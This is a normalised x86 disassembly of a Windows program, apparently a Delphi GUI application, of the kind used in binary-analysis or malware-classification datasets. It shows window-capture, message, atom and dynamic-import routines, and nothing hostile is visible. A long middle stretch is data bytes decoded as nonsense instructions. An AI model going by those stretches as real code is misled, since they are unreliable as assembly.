lea eax [ ebx + 0x1c ]
call sub_406e18
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_457a58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4579c0
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_457a80
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_4579e4
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_457a00
pop ebx
retn
mov eax ebx
call sub_457a30
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_457ae4
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_457c4a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_457d68
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_457d4c
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_457d4c
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_457e58
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4032a8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4032a8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_4032a8
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_4032a8
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404038
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404038
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_457ee0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_458058
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_40911c
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_40408c
mov eax [ rw-data ]
call sub_4044f8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_40911c
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_40408c
mov eax [ rw-data ]
call sub_4044f8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4044f8
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b7c
mov [ rw-data ] eax
call sub_457ae4
mov dl 0x1
mov eax [ r-xdata ]
call sub_457900
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a87c
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46ba04
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_46d5ec
mov ecx r-xdata
mov edx sub_449904
mov eax [ r-xdata ]
call sub_418094
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45805f
lea eax [ ebp - 0x10 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4580c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_458127
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45812e
retn
mov eax rw-data
call sub_40d4f0
call sub_457e58
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404aec
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_404038
sub_458130
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4581b6
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4581bd
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_457ee0
mov eax [ r-xdata ]
call sub_417f08
mov eax [ r-xdata ]
call sub_417fa8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f54
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f54
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f54
sub_458404
stc
push ebx
push eax
push esp
mov es [ ebp ]
cmp al 0x8f
inc ebp
add [ eax - 0x6f ] al
inc ebp
add [ eax - 0x6f ] ah
inc ebp
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc eax
add al bh
xor al 0x40
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
in al 0x82
inc ebp
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sub al 0x84
inc ebp
add [ eax ] cl
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x9db00006
inc ebp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
add al 0x35
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
xchg [ ebp ] al
arpl [ ebp + 0x74 ] si
mov ah 0x5a
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
add [ eax ] al
inc [ ecx ]
add [ ebp ] 0x58
add [ eax ] al
inc [ eax + 0x1004591 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
mov ah 0x5a
inc ecx
add [ eax ] al
add bh bh
inc eax
inc ecx
add [ eax - 0x37ffbded ] bl
pop [ ebp ]
test al 0x13
inc edx
add [ eax - 0x1bffbdec ] ah
push ss
add [ edi + ecx * 4 ] ah
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
xor [ eax + 0x41 ] 0x0
add al [ eax ]
or [ ecx + 0x63 ] al
je r-xdata
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
je r-xdata
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax ] bh
mov es [ ebp ]
dec esp
nop
inc ebp
add [ eax + 0xb00458f ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
in al 0x16
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ esi + ecx * 4 - 0x6ff7ffbb ] ah
inc ecx
add al al
adc al [ edx ]
and al 0x8f
dec esp
imul esi [ ebx + 0x74 ] 0x84a40000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
test [ ebp ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ ebp + eax * 2 + 0x6800 ]
add [ ebx + eax * 4 + 0x45 ] bh
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
add [ eax ] al
add [ eax ] al
add ah bl
xchg [ ebp ] eax
and [ eax + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
jne r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ecx + ebp * 4 - 0x6ff7ffbf ] ah
inc ecx
add [ eax ] dl
popfd
inc ecx
add [ eax ] cl
pushfd
inc ecx
add [ esp + ebp * 4 + 0x41 ] cl
add [ eax - 0x7bffbe54 ] al
lodsb [ esi ]
xor eax 0x34f80040
inc eax
inc ebx
push 0x65676e61
in al 0x82
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
add [ eax ] al
add al [ eax ]
out dx al
inc ebp
add [ eax - 0x40000000 ] ah
add [ ebp ] sub_4216cc
cld
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ eax ] al
fadd [ edi - 0x77dfffbb ]
inc ebp
add [ eax ] al
dec esp
imul esi [ ebx + 0x74 ] 0x86dcc08b
inc ebp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
mov al [ 0xffffffffadfc0041 ]
inc ecx
add [ eax - 0x52 ] bl
inc ecx
add [ edi + ebp * 4 ] ch
inc ecx
add [ eax + ebp * 4 ] bl
inc ecx
add [ eax - 0x51 ] ch
inc ecx
add ah bl
scasd [ edi ]
inc ecx
add al bh
0xaa0c0045 0x41
push eax
fwait
inc ecx
add [ eax - 0x17ffbe56 ] ch
stosb [ edi ]
inc ecx
add [ ebx + ebp * 4 + 0x41 ] dl
add [ eax + 0x41 ] bh
add ah ah
lodsb [ esi ]
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3e40041 ] eax
inc ecx
add [ eax ] ah
lodsd [ esi ]
inc ecx
add [ eax ] dh
lodsd [ esi ]
inc ecx
add [ eax - 0x5c ] cl
inc ecx
add [ esp - 0x5ab7ffbf ] bl
inc ecx
add al ah
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax ] bh
cmpsd [ esi ] [ edi ]
inc ecx
add ah cl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x56 ] dh
inc ecx
add [ edx + ebp * 4 - 0x527bffbf ] cl
inc ecx
add ah dl
stosd [ edi ]
inc ecx
add [ edi + ebp * 4 - 0x505bffbf ] dl
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
inc ecx
add [ esp + ebp * 4 - 0x5377ffbf ] al
inc ecx
add al dl
popad
je r-xdata
inc [ edi - 0x77f3ffbb ]
inc ebx
jne r-xdata
inc ecx
add [ eax - 0x2fffbe54 ] cl
xor [ eax ] al
add [ eax ] al
lea eax [ eax ]
xor [ esi + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ esi + 0x45 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4586 0x0
add [ eax + ecx * 4 ] cl
dec esp
imul esi [ ebx + 0x74 ] r-xdata
loopne r-xdata
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x87040000
inc ebp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bh
xchg [ ebp ] eax
or al 0x88
jbe r-xdata
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + edx * 4 + 0x45 ] ch
add [ ebx + edx * 4 + 0x12c00045 ] bh
inc edx
add [ edi + ecx * 4 ] ah
inc ecx
add [ eax + 0x8004213 ] bl
sbb [ edx ] eax
mov [ ebp + eax * 2 + 0x45999800 ] cs
outsb
je r-xdata
add al [ ecx ]
pop es
dec eax
imul ebp [ esi + 0x74 ] 0x6727453
push ebx
je r-xdata
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax ] bl
xchg ebx eax
inc ebp
add al cl
sbb [ edx ] eax
insb
sbb [ edx ] eax
add [ ecx ] bl
inc edx
add [ eax ] dh
sbb [ edx ] eax
add al 0x19
inc edx
add al ah
lea eax [ ebp ]
rcl [ edi - 0x68a7ffbb ] 0x45
add ah ch
0xe0045 0x0
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ fs : eax ] al
add [ eax + edx + 0x780040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
pop [ ecx ]
cwde
adc eax [ edx ]
or [ ecx ] bl
inc edx
add [ esp + ecx * 4 - 0x6667ffbb ] cl
inc ebp
imul ebp [ esi + 0x67 ] 0x61430701
outsb
push ebx
push 0x4207776f
outsd
outsd
insb
popad
outsb
add [ eax + edx + 0x10000040 ] dl
inc eax
add [ eax + 0x4587 ] cl
add [ eax ] al
sub_458b50
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebp + eax * 2 + 0x1800 ] cl
add ah ah
jo r-xdata
and [ edx - 0x6dcbffbb ] dl
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x4bffbde9 ] bh
pop ss
inc edx
add ah ch
pop ss
inc edx
add [ eax + ebx + 0x42 ] cl
add [ eax ] ah
sbb [ edx ] al
push eax
sbb [ edx ] al
jo r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4218a8
test bl bl
jle r-xdata
mov edx esi
call sub_459030
add [ eax - 0x6e ] dh
inc ebp
add [ edx + edx * 4 - 0x6d67ffbb ] al
inc ebp
add [ edx + edx * 4 - 0x6d3fffbb ] ch
inc ebp
add ah dl
xchg edx eax
inc ebp
add al ch
xchg edx eax
inc ebp
add ah ch
xchg edx eax
inc ebp
add al dh
xchg edx eax
inc ebp
add ah dh
xchg edx eax
inc ebp
add al bh
xchg edx eax
inc ebp
add ah bh
xchg edx eax
inc ebp
add [ eax ] al
xchg ebx eax
inc ebp
add [ ebx + edx * 4 ] al
inc ebp
add [ eax ] cl
xchg ebx eax
inc ebp
add [ ebx + edx * 4 ] cl
inc ebp
add [ eax ] dl
xchg ebx eax
inc ebp
add [ ebx + edx * 4 ] dl
inc ebp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x51e85653
stosb [ edi ]
cli
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
xchg edx eax
inc ebp
inc ebp
add [ eax - 0x6e ] cl
inc ebp
add [ edx + edx * 4 + 0x45 ] bl
inc edx
add [ eax + ebx ] al
inc edx
add [ eax + 0x18 ] bl
inc edx
add [ eax ] ah
xchg edx eax
inc ebp
add [ edx + edx * 4 ] dh
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_458c1c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4218a8
test bl bl
jle r-xdata
mov edx esi
call sub_459030
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_458c8c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4213a8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_458d34
sub_458cc0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_458c50
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4187c4
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_418950
sub_458d08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404444
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_40408c
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_458d34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_459030
mov edx ebx
mov eax esi
call sub_459010
sub_458d5c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_458d34
sub_458d88
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46e368
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_4034a4
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421934
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_449730
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_458de0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46e390
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_4034a4
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421950
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_449730
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_458e38
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420f48
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_458fbc
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_458ea4
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_4032a8
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4189bc
call sub_4032a8
mov eax [ edi + 0x30 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420f94
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
sub_458ef4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_458f3c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418930
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov edx edi
call sub_458cc0
sub_458f88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_45aef0
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_45af34
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_421018
sub_458fc8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421264
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_459030
sub_459010
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418778
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_421018
pop esi
pop ebx
retn
sub_459030
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418a70
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_45904c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4590b4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_46417c
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_45c78c
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_459a6c
mov edx ebp
call sub_459b60
inc eax
je r-xdata
sub_459140
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_459160
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_459180
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_459630
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
